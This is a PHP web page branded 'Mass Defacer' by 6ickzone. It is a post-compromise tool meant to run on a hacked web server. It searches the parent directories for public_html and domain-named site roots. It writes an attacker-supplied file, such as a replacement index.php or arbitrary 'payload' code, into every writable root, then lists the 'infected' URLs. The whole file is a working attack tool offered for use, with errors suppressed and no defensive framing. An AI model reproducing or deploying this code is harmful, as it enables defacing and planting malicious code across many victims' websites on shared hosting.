<?php
/**
 * Author: 0x6ick - 6ickzone | t.me/yungx6ick
 */
ini_set('display_errors', 0);
error_reporting(0);

// --- LOGIKA SEARCH ROOT ---
function locateRoots($start) {
    $roots = [];
    $dir = realpath($start);
    while ($dir && $dir !== '/' && $dir !== '.') {
        if (is_dir($dir."/public_html")) $roots[] = realpath($dir."/public_html");
        $subs = glob($dir . "/*", GLOB_ONLYDIR);
        if ($subs) {
            foreach ($subs as $sub) {
                if (preg_match('/\.[a-z]+$/', basename($sub))) $roots[] = realpath($sub);
            }
        }
        $dir = dirname($dir);
    }
    return array_unique($roots);
}

// --- LOGIKA DEPLOY ---
$deployResult = [];
if (isset($_POST['deploy'])) {
    $custName = $_POST['filename'];
    $custContent = $_POST['content'];
    $roots = locateRoots(__DIR__);

    foreach ($roots as $targetPath) {
        if (is_writable($targetPath)) {
            $filePath = "$targetPath/$custName";
            if (@file_put_contents($filePath, $custContent) !== false) {
                $filePathReal = realpath($filePath);
                $docRootReal  = realpath($_SERVER['DOCUMENT_ROOT'] ?? '');
                $scheme = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
                $host = $_SERVER['HTTP_HOST'] ?? 'localhost';

                if ($filePathReal && $docRootReal && strpos($filePathReal, $docRootReal) === 0) {
                    $relativePath = str_replace($docRootReal, '', $filePathReal);
                    $url = $scheme . "://" . $host . "/" . ltrim(str_replace('\\', '/', $relativePath), '/');
                } else {
                    $maybeDomain = basename($targetPath);
                    $url = (preg_match('/^[a-z0-9.-]+\.[a-z]{2,}$/i', $maybeDomain)) 
                           ? "$scheme://$maybeDomain/$custName" 
                           : "$scheme://" . $host . "/" . basename($targetPath) . "/$custName";
                }
                $deployResult[] = $url;
            }
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta name="viewport" content="width=1024">
    <title>6ickzone // Mass Defacer</title>
    <link href="https://fonts.googleapis.com/css2?family=Special+Elite&family=Stalinist+One&display=swap" rel="stylesheet">
    <style>
        :root { --red: #ff0000; --black: #000000; --white: #ffffff; --gray: #1a1a1a; }
        body { 
            font-family: 'Special Elite', cursive; background-color: var(--black); 
            color: var(--white); padding: 20px; margin: 0;
            /* Hapus text-transform uppercase global agar extension file aman */
            background-image: radial-gradient(circle, #1a1a1a 1px, transparent 1px); background-size: 20px 20px;
        }
        .container { max-width: 900px; margin: auto; border: 5px solid var(--white); padding: 10px; background: var(--black); position: relative; }
        .header { text-align: center; border-bottom: 10px solid var(--red); padding-bottom: 20px; margin-bottom: 30px; }
        .header h1 { font-family: 'Stalinist One', cursive; font-size: clamp(30px, 8vw, 50px); margin: 0; text-shadow: 5px 5px var(--red); text-transform: uppercase; }
        .header span { 
            background: var(--red); color: var(--black); padding: 5px 15px; font-weight: bold; 
            display: inline-block; transform: rotate(-1.5deg); margin-top: 10px; font-size: 14px;
        }
        .card { background: var(--gray); border: 2px solid var(--white); padding: 25px; margin-bottom: 20px; }
        label { display: block; margin: 15px 0 5px; color: var(--red); font-size: 1.2rem; text-transform: uppercase; }
        
        /* Input & Textarea dibikin normal (tidak auto-uppercase) */
        input[type="text"], textarea { 
            width: 100%; background: var(--black); border: 2px solid var(--red); color: var(--white); 
            padding: 12px; box-sizing: border-box; font-family: 'Special Elite', cursive; outline: none;
            text-transform: none; /* Pastikan input tetap sesuai ketikan user */
        }
        
        button { 
            background: var(--red); color: var(--white); border: none; padding: 15px; cursor: pointer; 
            font-family: 'Stalinist One', cursive; margin-top: 25px; width: 100%; font-size: 1.2rem;
            clip-path: polygon(5% 0%, 100% 0%, 95% 100%, 0% 100%); text-transform: uppercase;
        }
        button:hover { background: var(--white); color: var(--red); }
        
        .result-box { background: var(--white); padding: 15px; border: 2px solid var(--red); max-height: 400px; overflow-y: auto; color: var(--black); }
        .url-item { font-size: 13px; margin-bottom: 8px; font-weight: bold; border-bottom: 1px solid #ccc; padding-bottom: 4px; word-break: break-all; text-transform: none; }
        
        .copy-btn { background: var(--black); color: var(--white); border: 1px solid var(--white); padding: 8px 15px; cursor: pointer; margin-bottom: 15px; font-family: 'Special Elite'; text-transform: uppercase; }
        .copy-btn:active { background: var(--red); }
        
        footer { text-align: center; font-size: 10px; padding: 20px; border-top: 2px solid var(--white); margin-top: 30px; letter-spacing: 3px; text-transform: uppercase; }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <h1>MASS DEFACER</h1>
        <span>Where creativity, exploitation, and expression collide</span>
    </div>

    <div class="card">
        <form method="POST">
            <label>[ Target_Filename ]</label>
            <input type="text" name="filename" placeholder="index.php" required value="<?= htmlspecialchars($_POST['filename'] ?? '') ?>">
            
            <label>[ Payload_Content ]</label>
            <textarea name="content" rows="10" placeholder="Paste your code here..." required><?= htmlspecialchars($_POST['content'] ?? '') ?></textarea>
            
            <button type="submit" name="deploy">INITIATE SPREAD</button>
        </form>
    </div>

    <?php if (!empty($deployResult)): ?>
    <div class="card" style="border-color: var(--red);">
        <h2 style="color: var(--red); margin-top:0; text-transform: uppercase;">Infected_Roots (<?= count($deployResult) ?>)</h2>
        <button class="copy-btn" id="btnCopy" onclick="copyToClipboard()">[ CLONE_URLS ]</button>
        <div class="result-box" id="resultLink">
            <?php foreach ($deployResult as $url): ?>
                <div class="url-item"><?= htmlspecialchars($url) ?></div>
            <?php endforeach; ?>
        </div>
    </div>
    <textarea id="tempCopy" style="position:absolute; left:-9999px;"></textarea>
    <?php endif; ?>

    <footer>
        0x6ick // 6ickzone // 2026 // NO_MERCY
    </footer>
</div>

<script>
function copyToClipboard() {
    const items = document.querySelectorAll('.url-item');
    let text = "";
    items.forEach(item => { text += item.innerText + "\n"; });
    
    const temp = document.getElementById('tempCopy');
    temp.value = text;
    temp.select();
    temp.setSelectionRange(0, 99999);

    try {
        document.execCommand('copy');
        const btn = document.getElementById('btnCopy');
        btn.innerText = "[ COPIED_SUCCESSFULLY ]";
        btn.style.backgroundColor = "var(--red)";
        setTimeout(() => { 
            btn.innerText = "[ CLONE_URLS ]"; 
            btn.style.backgroundColor = "var(--black)";
        }, 2000);
    } catch (err) {
        console.error('Copy failed');
    }
}
</script>

</body>
</html>
